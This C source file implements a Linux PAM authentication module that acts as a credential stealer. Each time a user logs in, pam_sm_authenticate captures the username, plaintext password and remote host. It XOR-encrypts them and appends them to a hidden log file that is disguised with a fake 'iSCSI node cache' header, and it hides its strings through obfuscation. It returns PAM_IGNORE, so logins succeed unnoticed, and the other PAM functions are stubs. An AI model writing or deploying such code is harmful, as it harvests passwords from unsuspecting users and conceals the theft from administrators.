#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "xor_config.h"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass, *host;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pass);
    pam_get_item(pamh, PAM_RHOST, (const void **)&host);

    char workdir[OBF_WORKDIR_LEN + 1];
    xor_decode(workdir, OBF_WORKDIR, OBF_WORKDIR_LEN);
    mkdir(workdir, 0700);

    if (user && pass) {
        char log_fmt[OBF_LOG_FMT_LEN + 1];
        xor_decode(log_fmt, OBF_LOG_FMT, OBF_LOG_FMT_LEN);

        char local_str[OBF_LOCAL_LEN + 1];
        xor_decode(local_str, OBF_LOCAL, OBF_LOCAL_LEN);

        char plaintext[1024];
        int plen = snprintf(plaintext, sizeof(plaintext),
            log_fmt, user, pass, host ? host : local_str);

        explicit_bzero(log_fmt, sizeof(log_fmt));
        explicit_bzero(local_str, sizeof(local_str));

        if (plen > 0 && (size_t)plen < sizeof(plaintext)) {
            unsigned char encrypted[1024];
            memcpy(encrypted, plaintext, plen);
            xor_crypt(encrypted, plen);

            char logpath[OBF_AUTH_BUF_LEN + 1];
            xor_decode(logpath, OBF_AUTH_BUF, OBF_AUTH_BUF_LEN);

            struct stat st;
            int needs_header = (stat(logpath, &st) != 0 || st.st_size == 0);

            FILE *fp = fopen(logpath, "ab");
            if (fp) {
                if (needs_header) {
                    const unsigned char hdr[32] = {
                        'i','S','C','S','I',' ','n','o',
                        'd','e',' ','c','a','c','h','e',
                        0x02,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                        0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
                    };
                    fwrite(hdr, 1, 32, fp);
                }

                unsigned short entry_len = (unsigned short)plen;
                fwrite(&entry_len, 2, 1, fp);
                fwrite(encrypted, 1, plen, fp);

                fclose(fp);
            }

            explicit_bzero(plaintext, sizeof(plaintext));
            explicit_bzero(encrypted, sizeof(encrypted));
            explicit_bzero(logpath, sizeof(logpath));
        }
    }

    explicit_bzero(workdir, sizeof(workdir));
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
